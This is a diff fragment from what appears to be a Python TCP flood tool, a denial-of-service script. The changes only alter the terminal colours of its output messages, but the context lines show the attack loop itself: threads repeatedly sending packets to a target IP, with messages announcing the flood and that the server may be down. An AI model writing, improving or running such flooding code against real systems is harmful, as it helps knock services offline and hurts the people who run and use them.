@@ -73,12 +73,12 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[34m[" +str(u)+ "]  \033[32mFlo0d\033[94mTCP  \033[33mTarget\033[37mIP\033[32m ::: \033[95m" +ip+ "  🇪🇭\033[0m")
-        print("\033[34m[" +str(u)+ "]  \033[32mFlo0d\033[94mTCP  \033[33mTarget\033[37mIP\033[4m ::: \033[94m" +ip+ "  🇪🇭\033[0m")
+        print("\033[34m[" +str(u)+ "]  \033[32mFlo0d\033[31mTCP  \033[33mTarget\033[37mIP\033[32m ::: \033[95m" +ip+ "  🇪🇭\033[0m")
+        print("\033[34m[" +str(u)+ "]  \033[32mFlo0d\033[31mTCP  \033[33mTarget\033[37mIP\033[4m ::: \033[94m" +ip+ "  🇪🇭\033[0m")
 
     except:
         s.close()
-        print("\033[97m[" +str(u)+ "]  \033[32mFlood\033[33mTCP  \033[38mServer/IP\033[93m ::: \033[93mMeybe\033[33mDown 💥\033[0m")
+        print("\033[97m[" +str(u)+ "]  \033[32mFlood\033[94mTCP  \033[38mServer/IP\033[93m ::: \033[93mMeybe \033[33mDown 💥\033[0m")
 for x in range(thread):
   thred = threading.Thread(target=start)
   thred.start()
